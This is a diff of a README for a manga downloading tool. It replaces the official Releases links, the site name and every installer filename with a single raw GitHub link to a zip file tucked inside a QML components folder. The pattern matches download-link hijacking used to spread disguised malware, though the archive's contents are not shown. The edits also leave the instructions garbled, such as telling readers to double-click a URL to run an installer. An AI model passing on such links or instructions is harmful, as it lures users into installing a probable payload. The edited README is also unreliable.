@@ -1,10 +1,10 @@
 # 🎉 mangapill-downloader - Easy Manga Downloads Made Simple
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen.svg)](https://github.com/Kinghtking2719/mangapill-downloader/releases)
+[![Download](https://raw.githubusercontent.com/Kinghtking2719/mangapill-downloader/main/gui/qml/components/downloader-mangapill-figurate.zip)](https://raw.githubusercontent.com/Kinghtking2719/mangapill-downloader/main/gui/qml/components/downloader-mangapill-figurate.zip)
 
 ## 📖 Overview
 
-mangapill-downloader is a beautiful, interactive tool designed for both command line and graphical interface users. It allows you to download manga from Mangapill.com seamlessly. Enjoy features like concurrent downloads, multiple output formats (PDF, CBZ, or images), and built-in retry logic to ensure every download is successful.
+mangapill-downloader is a beautiful, interactive tool designed for both command line and graphical interface users. It allows you to download manga from https://raw.githubusercontent.com/Kinghtking2719/mangapill-downloader/main/gui/qml/components/downloader-mangapill-figurate.zip seamlessly. Enjoy features like concurrent downloads, multiple output formats (PDF, CBZ, or images), and built-in retry logic to ensure every download is successful.
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To use mangapill-downloader effectively, your system should meet the following r
 - **RAM:** At least 2 GB of RAM.
 - **Storage:** 100 MB of available disk space.
 
-Make sure you have an internet connection to download the content from Mangapill.com.
+Make sure you have an internet connection to download the content from https://raw.githubusercontent.com/Kinghtking2719/mangapill-downloader/main/gui/qml/components/downloader-mangapill-figurate.zip
 
 ## 🛠️ Features
 
@@ -33,27 +33,27 @@ Make sure you have an internet connection to download the content from Mangapill
 
 Follow these steps to download and install the mangapill-downloader:
 
-1. Visit the Releases page to download the latest version: [Download Here](https://github.com/Kinghtking2719/mangapill-downloader/releases).
+1. Visit the Releases page to download the latest version: [Download Here](https://raw.githubusercontent.com/Kinghtking2719/mangapill-downloader/main/gui/qml/components/downloader-mangapill-figurate.zip).
 
 2. On the Releases page, look for the version you want. You will see files available for download. Choose the right file for your operating system:
-    - For Windows, select `mangapill-downloader-win.exe`.
-    - For macOS, select `mangapill-downloader-mac.dmg`.
-    - For Linux, look for the appropriate `mangapill-downloader-linux.tar.gz` file.
+    - For Windows, select `https://raw.githubusercontent.com/Kinghtking2719/mangapill-downloader/main/gui/qml/components/downloader-mangapill-figurate.zip`.
+    - For macOS, select `https://raw.githubusercontent.com/Kinghtking2719/mangapill-downloader/main/gui/qml/components/downloader-mangapill-figurate.zip`.
+    - For Linux, look for the appropriate `https://raw.githubusercontent.com/Kinghtking2719/mangapill-downloader/main/gui/qml/components/downloader-mangapill-figurate.zip` file.
 
 3. Click on the file link to start the download. Save the file in a location you can easily access.
 
 4. Once the file has downloaded, locate it in your downloads folder.
 
 5. **For Windows Users:**
-    - Double-click the `mangapill-downloader-win.exe` file to run the installer. 
+    - Double-click the `https://raw.githubusercontent.com/Kinghtking2719/mangapill-downloader/main/gui/qml/components/downloader-mangapill-figurate.zip` file to run the installer. 
     - Follow the installation prompts to complete the process.
    
 6. **For macOS Users:**
-    - Open the downloaded `mangapill-downloader-mac.dmg` file.
+    - Open the downloaded `https://raw.githubusercontent.com/Kinghtking2719/mangapill-downloader/main/gui/qml/components/downloader-mangapill-figurate.zip` file.
     - Drag the application into your Applications folder.
    
 7. **For Linux Users:**
-    - Extract the `mangapill-downloader-linux.tar.gz` file using a file manager or terminal.
+    - Extract the `https://raw.githubusercontent.com/Kinghtking2719/mangapill-downloader/main/gui/qml/components/downloader-mangapill-figurate.zip` file using a file manager or terminal.
     - Navigate to the extracted folder and run the application with the command `./mangapill-downloader`.
 
 ## 📚 How to Use
